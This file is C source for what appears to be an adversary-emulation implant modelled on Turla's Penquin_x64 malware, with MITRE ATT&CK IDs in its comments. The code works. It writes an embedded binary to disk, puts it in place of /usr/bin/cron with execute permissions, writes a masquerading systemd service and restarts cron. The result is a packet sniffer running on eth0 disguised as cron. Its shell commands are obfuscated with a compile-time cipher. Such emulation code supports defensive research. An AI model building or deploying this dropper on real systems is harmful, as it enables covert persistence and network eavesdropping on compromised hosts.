/*
 * main.c:
 *      About:
 *          Initial Execution:
 *          1. Obfuscates strings using an encrypt function (leverages crypt.h)
 *          2. Writes malicious payload to disk
 *          3. Moves malicious payload into a less inconspicuous location + adds executable permissions
 *          4. Write a service file
 *          5. Stop, reload, and start the cron system service
 *      MITRE ATT&CK Techniques:
 *          T1027 : Obfuscated Files or Information
 *          T1036.004: Masquerading: Masquerade Task or Service
 *          T1059.004: Command and Scripting Interpreter: Unix Shell
 *          T1543.002: Create or Modify System Process: Systemd Service
 *          T1222: File and Directory Permissions Modification
 *          T1027.008: Obfuscated Files or Information: Stripped Payloads
 *          T1027.009: Obfuscated Files or Information: Embedded Payloads     
 *      Result:
 *      	Returns 0 if successful, returns a 1 if not.
 *          If successful, systemd executes our malicious binary as cron, our malicious binary executes cron as a child process, and the sniffer is installed on ETH0 interface.
 *      CTI:
 *           https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
//malicious binary saved as a c-formatted byte array in a header file
#include "cron.h"
//macro cipher
#include "crypt.h"

//concatenate ALL the strings function
char * concatStrings(   const char *a, 
                        const char *b,
                        const char *c,
                        const char *d,
                        const char *e,
                        const char *f,
                        const char *g,
                        const char *h,
                        const char *i,
                        const char *j,
                        const char *k,
                        const char *l,
                        const char *m,
                        const char *n,
                        const char *o,
                        const char *p
){
    size_t len =    strlen(a) + 
                    strlen(b) + 
                    strlen(c) + 
                    strlen(d) +     
                    strlen(e) + 
                    strlen(f) +
                    strlen(g) +
                    strlen(h) +
                    strlen(i) +
                    strlen(j) +
                    strlen(k) +
                    strlen(l) +
                    strlen(m) +
                    strlen(n) +
                    strlen(o) +
                    strlen(p);
    char* str = malloc(len + 1);
    strcpy(str, a);
    strcat(str, b);
    strcat(str, c); 
    strcat(str, d);
    strcat(str, e);
    strcat(str, f);
    strcat(str, g);
    strcat(str, h);
    strcat(str, i);
    strcat(str, j);
    strcat(str, k);
    strcat(str, l);
    strcat(str, m);
    strcat(str, n);
    strcat(str, o);
    strcat(str, p);
    return str;
}

    // MITRE ATT&CK Techniques:
    // T1027: Obfuscated Files or Information
    // References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    // Obfuscate strings in memory
int do_start(){
	char mvCMD[] = __ENCRYPT64("mv ./cron /usr/bin/cron");
    char addxCMD[] = __ENCRYPT64("chmod +x /usr/bin/cron");
    char stopcCMD[] = __ENCRYPT64("systemctl stop cron");
    char serviceCMD[] = __ENCRYPT64("cat > /etc/systemd/system/cron.service <<EOF\n\0");
    char serviceCMD1[] = __ENCRYPT64("[Unit]\n\0");
    char serviceCMD2[] = __ENCRYPT64("Description=Regular background program processing daemonb\n\0");
    char serviceCMD3[] = __ENCRYPT64("Documentation=man:cron(8)\n\0");
    char serviceCMD4[] = __ENCRYPT64("After=remote-fs.target nss-user-lookup.target\n\0");
    char serviceCMD5[] = __ENCRYPT64("\n\0");
    char serviceCMD6[] = __ENCRYPT64("[Service]\n");
    char serviceCMD7[] = __ENCRYPT64("EnvironmentFile=-/etc/default/cron\n\0");
    char serviceCMD8[] = __ENCRYPT64("ExecStart=/usr/bin/cron -f $EXTRA_OPTS\n\0");
    char serviceCMD9[] = __ENCRYPT64("IgnoreSIGPIPE=false\n\0");
    char serviceCMD10[] = __ENCRYPT64("KillMode=process\n\0");
    char serviceCMD11[] = __ENCRYPT64("Restart=on-failure\n\0");
    char serviceCMD12[] = __ENCRYPT64("\n\0");
    char serviceCMD13[] = __ENCRYPT64("[Install]\n");
    char serviceCMD14[] = __ENCRYPT64("WantedBy=multi-user.target\n\0");
    char serviceCMD15[] = __ENCRYPT64("EOF\0");
    char reloadCMD[] = __ENCRYPT64("systemctl daemon-reload\0");
    char restartcronCMD[] = __ENCRYPT64("systemctl start cron\0");
    int result=0;

    // MITRE ATT&CK Techniques:
    // T1027: Obfuscated Files or Information
    // T1059.004: Command and Scripting Interpreter: Unix Shell
    // T1036.004: Masquerading: Masquerade Task or Service
    // References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    // Move our malicous binary to where cron would be expected to be seen on the system. 
    result = system(__DECRYPT64(mvCMD));
    if (result == -1){
        return(result);
    }

    // MITRE ATT&CK Techniques:
    // T1059.004: Command and Scripting Interpreter: Unix Shell
    // T1027: Obfuscated Files or Information
    // T1222: File and Directory Permissions Modification
    // References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    // Add executable permissions
    result = system(__DECRYPT64(addxCMD));
    sleep(2);
    if (result == -1){
        return(result);
    }

    // MITRE ATT&CK Techniques:
    // T1059.004: Command and Scripting Interpreter: Unix Shell
    // T1027: Obfuscated Files or Information
    // References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    // Stop the current running cron to free up resources
    result = system(__DECRYPT64(stopcCMD));
    sleep(2);
    if (result == -1){
        return(result);
    }
    
    // MITRE ATT&CK Techniques:
    // T1059.004: Command and Scripting Interpreter: Unix Shell
    // T1027: Obfuscated Files or Information
    // T1543.002: Create or Modify System Process: Systemd Service
    // References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    // Add the cron service file to /etc/systemd/system/
    char* fullserviceCMD = concatStrings(
            __DECRYPT64(serviceCMD),
            __DECRYPT64(serviceCMD1),
            __DECRYPT64(serviceCMD2),
            __DECRYPT64(serviceCMD3),
            __DECRYPT64(serviceCMD4),
            __DECRYPT64(serviceCMD5),
            __DECRYPT64(serviceCMD6),
            __DECRYPT64(serviceCMD7),
            __DECRYPT64(serviceCMD8),
            __DECRYPT64(serviceCMD9),
            __DECRYPT64(serviceCMD10),
            __DECRYPT64(serviceCMD11),
            __DECRYPT64(serviceCMD12),
            __DECRYPT64(serviceCMD13),
            __DECRYPT64(serviceCMD14),
            __DECRYPT64(serviceCMD15)
    );
    result = system(fullserviceCMD);
    sleep(2);
    if (result == -1){
        return(result);
    }
    free(fullserviceCMD);

    // MITRE ATT&CK Techniques:
    // T1059.004: Command and Scripting Interpreter: Unix Shell
    // T1027: Obfuscated Files or Information
    // References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    // Reload the resources cron service uses
    result = system(__DECRYPT64(reloadCMD));
    sleep(2);
    if (result == -1){
        return(result);
    }

    // MITRE ATT&CK Techniques:
    // T1059.004: Command and Scripting Interpreter: Unix Shell
    // T1027: Obfuscated Files or Information
    // T1543.002: Create or Modify System Process: Systemd Service
    // T1036.004: Masquerading: Masquerade Task or Service
    // References: https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
    // Start the cron service to execute our sniffer which executes real cron as a child process
    result = system(__DECRYPT64(restartcronCMD));
    if (result == -1){
        return(result);
    }
    return result;
}

/*
 * write_file():
 *      About:
 *          Writes a malicous binary to disk named cron. 
 *      MITRE ATT&CK Tecnhiques:
 *          T1027.008: Obfuscated Files or Information: Stripped Payloads
 *          T1027.009: Obfuscated Files or Information: Embedded Payloads  
 *          T1036.004: Masquerading: Masquerade Task or Service
 *      Result:
 *      	Returns 0 if successful, returns a -1 if not.
 *          If successful, the file was written to disk.
 *      CTI:
 *          https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf 
 */

int write_file(){
    FILE * fp;
    int result = 0;
    fp = fopen("cron", "w");
    if(fp == NULL)
    {
        return(result);
    }
    fwrite(cron , 1 , cron_len , fp );
    fclose(fp);
    return result;
}

int main(){
    int result =0;
    //write the file to disk
    result = write_file();
    sleep(2);
    if (result == -1){
        return 1;
    }

    //perform startup commands with system()
    result = do_start();
    if (result == -1){
        return 1;
    }
    return 0;
}
